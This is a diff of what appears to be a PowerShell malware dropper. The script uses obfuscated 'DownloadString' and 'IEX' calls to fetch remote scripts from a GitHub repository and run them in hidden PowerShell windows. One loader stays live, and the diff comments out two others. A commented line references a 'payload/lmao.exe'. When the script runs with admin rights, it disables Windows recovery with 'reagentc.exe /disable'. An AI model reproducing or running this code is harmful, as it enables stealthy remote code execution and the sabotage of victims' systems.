@@ -101,15 +101,15 @@ $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/an
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
-$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/ok.ps1")
-$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+#$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/ok.ps1")
+#$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+#Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
 
 
-$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/shellcode/loaderclient.ps1")
-$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+# $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/shellcode/loaderclient.ps1")
+# $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+# Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
 
 # $url = "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/payload/lmao.exe"
@@ -188,8 +188,4 @@ if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]:
     reagentc.exe /disable
 } else {
     echo "Not running as Admin"
-}
-
-while ($true) {
-    Start-Sleep -Seconds 5
 }
